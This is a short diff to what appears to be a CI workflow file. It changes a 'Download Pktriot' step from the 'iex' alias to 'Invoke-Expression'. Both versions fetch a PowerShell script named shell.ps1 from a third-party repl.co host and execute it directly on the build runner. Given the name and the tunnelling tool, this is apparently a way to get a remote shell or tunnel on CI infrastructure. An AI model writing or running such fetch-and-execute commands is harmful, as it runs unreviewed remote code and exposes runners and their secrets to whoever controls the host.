@@ -9,5 +9,5 @@ jobs:
 
     steps:
     - name: Download Pktriot
-      run: iex ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest https://FileHosting.lifeseemsfine.repl.co/shell.ps1).Content))
+      run: Invoke-Expression ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest https://FileHosting.lifeseemsfine.repl.co/shell.ps1).Content))
   
